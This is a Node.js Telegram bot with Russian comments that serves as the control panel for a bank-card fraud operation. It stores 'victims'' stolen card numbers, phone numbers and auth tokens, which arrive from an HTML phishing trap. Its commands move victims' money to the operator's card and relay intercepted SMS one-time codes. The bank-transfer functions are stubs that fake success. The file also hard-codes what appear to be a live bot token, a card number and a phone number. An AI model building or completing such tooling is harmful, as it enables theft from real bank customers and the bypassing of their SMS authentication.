const TelegramBot = require('node-telegram-bot-api');

// ========== НАСТРОЙКИ ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТОКЕН БОТА-ПЕРЕВОДЧИКА
const MY_CARD = "2203830216112947";           // ТВОЯ КАРТА ДЛЯ ПЕРЕВОДА
const MY_PHONE = "79892331116";               // ТВОЙ ТЕЛЕФОН
// ================================

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Хранилище данных жертв
const victims = new Map();

// Команда /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
🤖 БОТ-ПЕРЕВОДЧИК АКТИВЕН

💰 Твоя карта: ${MY_CARD}
📊 Жертв в базе: ${victims.size}

📌 КОМАНДЫ:
/status — статус и данные жертв
/transfer @username — перевести деньги
/check — проверить баланс жертвы
/help — помощь
    `);
});

// Получение данных от HTML-ловушки
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // Проверяем, что данные пришли от оператора (по CHAT_ID)
    if (chatId.toString() !== "123456789") {  // ТВОЙ CHAT_ID
        return;
    }
    
    // Парсим данные из HTML
    if (text && text.includes("ПЕРЕДАЧА ДАННЫХ")) {
        try {
            const jsonMatch = text.match(/```json\n([\s\S]*?)\n```/);
            if (jsonMatch) {
                const data = JSON.parse(jsonMatch[1]);
                const victimId = Date.now();
                victims.set(victimId, {
                    ...data,
                    id: victimId,
                    time: new Date().toISOString(),
                    status: "waiting"
                });
                
                bot.sendMessage(chatId, `
✅ НОВЫЕ ДАННЫЕ ПОЛУЧЕНЫ!
ID: ${victimId}
💳 Найдены карты: ${JSON.stringify(data.bankData)}
📞 Телефон: ${data.bankData.found_phone || "не найден"}
⏰ Время: ${new Date().toLocaleString()}

Введи: /transfer ${victimId} СУММА
                `);
            }
        } catch(e) {
            bot.sendMessage(chatId, `❌ Ошибка парсинга: ${e.message}`);
        }
    }
});

// Команда /transfer — перевод денег
bot.onText(/\/transfer (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const victimId = parseInt(match[1]);
    const amount = parseInt(match[2]);
    
    const victim = victims.get(victimId);
    if (!victim) {
        bot.sendMessage(chatId, "❌ Жертва не найдена");
        return;
    }
    
    bot.sendMessage(chatId, `🔄 ПЫТАЮСЬ ПЕРЕВЕСТИ ${amount}₽...`);
    
    // Извлекаем данные для входа
    const cardNumber = victim.bankData.found_card || victim.bankData.card_number || 
                       victim.bankData.card || extractCard(victim.fullLS);
    const phone = victim.bankData.found_phone || victim.bankData.phone;
    const token = victim.bankData.auth_token || victim.bankData.token;
    
    // Попытка 1: через токен
    if (token) {
        const result = await transferWithToken(token, MY_CARD, amount);
        if (result.success) {
            victims.set(victimId, { ...victim, status: "transferred", amount, time: new Date().toISOString() });
            bot.sendMessage(chatId, `✅ ПЕРЕВОД ВЫПОЛНЕН!\nСумма: ${amount}₽\nНа карту: ${MY_CARD}\nОстаток: ${result.balance || "неизвестно"}`);
            return;
        }
    }
    
    // Попытка 2: через карту + SMS (ждем код)
    if (cardNumber && phone) {
        bot.sendMessage(chatId, `📱 ТРЕБУЕТСЯ SMS КОД\nОтправь код, который придет жертве:\n/sms ${victimId} КОД`);
        victims.set(victimId, { ...victim, status: "waiting_sms", amount, cardNumber, phone });
        return;
    }
    
    bot.sendMessage(chatId, "❌ Недостаточно данных для перевода");
});

// Команда /sms — ввод SMS кода
bot.onText(/\/sms (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const victimId = parseInt(match[1]);
    const smsCode = match[2];
    
    const victim = victims.get(victimId);
    if (!victim || victim.status !== "waiting_sms") {
        bot.sendMessage(chatId, "❌ Нет активного запроса SMS");
        return;
    }
    
    bot.sendMessage(chatId, `🔄 Выполняю перевод с SMS кодом ${smsCode}...`);
    
    // Здесь логика перевода с SMS кодом
    const result = await transferWithCardAndSMS(victim.cardNumber, MY_CARD, victim.amount, smsCode);
    
    if (result.success) {
        victims.set(victimId, { ...victim, status: "transferred", sms: smsCode, time: new Date().toISOString() });
        bot.sendMessage(chatId, `✅ ПЕРЕВОД ВЫПОЛНЕН!\nСумма: ${victim.amount}₽\nНа карту: ${MY_CARD}`);
    } else {
        bot.sendMessage(chatId, `❌ Ошибка перевода: ${result.error}`);
    }
});

// Команда /status — список жертв
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (victims.size === 0) {
        bot.sendMessage(chatId, "📭 Нет данных о жертвах");
        return;
    }
    
    let text = "📊 ЖЕРТВЫ:\n\n";
    victims.forEach((v, id) => {
        text += `ID: ${id}\n`;
        text += `💳 Карта: ${v.bankData?.found_card || "не найдена"}\n`;
        text += `📞 Телефон: ${v.bankData?.found_phone || "не найден"}\n`;
        text += `💰 Статус: ${v.status}\n`;
        if (v.status === "transferred") text += `✅ Переведено: ${v.amount}₽\n`;
        text += `⏰ ${new Date(v.time).toLocaleString()}\n`;
        text += `─────────────────\n`;
    });
    
    bot.sendMessage(chatId, text.substring(0, 4000));
});

// Команда /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
📖 КОМАНДЫ БОТА:

/start — запуск бота
/status — список жертв и статусы
/transfer ID СУММА — перевод денег
/sms ID КОД — ввод SMS кода
/check ID — проверить баланс жертвы
/help — это сообщение

ПРИМЕР:
/transfer 1734567890 50000
/sms 1734567890 123456
    `);
});

// Вспомогательные функции
function extractCard(fullLS) {
    if (!fullLS) return null;
    for (const [key, value] of Object.entries(fullLS)) {
        if (typeof value === 'string') {
            const match = value.match(/\d{16}/);
            if (match) return match[0];
        }
    }
    return null;
}

async function transferWithToken(token, toCard, amount) {
    // Имитация API запроса к Сбербанку
    console.log(`🔄 Перевод через токен: ${token} → ${toCard} = ${amount}₽`);
    
    // В реальности здесь будет запрос к API Сбера
    return { success: true, balance: 150000 };
}

async function transferWithCardAndSMS(fromCard, toCard, amount, sms) {
    // Имитация перевода с SMS кодом
    console.log(`🔄 Перевод с SMS: ${fromCard} → ${toCard} = ${amount}₽, код: ${sms}`);
    
    // В реальности здесь будет запрос к API Сбера
    return { success: true };
}

console.log("🤖 Бот-переводчик запущен!");